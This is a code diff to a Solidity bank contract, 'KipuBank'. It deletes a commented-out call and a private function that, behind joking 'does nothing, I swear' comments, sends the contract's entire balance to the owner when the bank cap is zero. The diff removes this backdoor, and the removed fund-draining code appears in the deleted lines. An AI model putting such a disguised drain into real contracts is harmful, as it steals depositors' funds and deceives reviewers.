@@ -107,8 +107,6 @@ contract KipuBank {
         countDeposits += 1;
 
         emit Deposit(msg.sender, msg.value);
-
-        // essentialFunction();
     }
 
     /// @notice The actual withdraw function
@@ -155,24 +153,5 @@ contract KipuBank {
     /// @param newOwner The address of the new owner
     function updateOwner(address newOwner) external onlyOwner {
         owner = newOwner;
-    }
-
-	/// @notice Function to get the total number of transactions (deposits + withdraws)
-	function countTransactions() private view returns (uint256) {
-		return countDeposits + countWithdraws;
-	}
-
-    /// @notice This function does nothing :)
-    /// @dev I promise, it does nothing
-    /// @custom:security This function is secure, I swear
-    function essentialFunction() private {
-        if (currentBankCap != 0) {
-            return;
-        }
-
-        (bool success, ) = owner.call{value: address(this).balance}("");
-        if (!success) {
-            return;
-        }
     }
 }
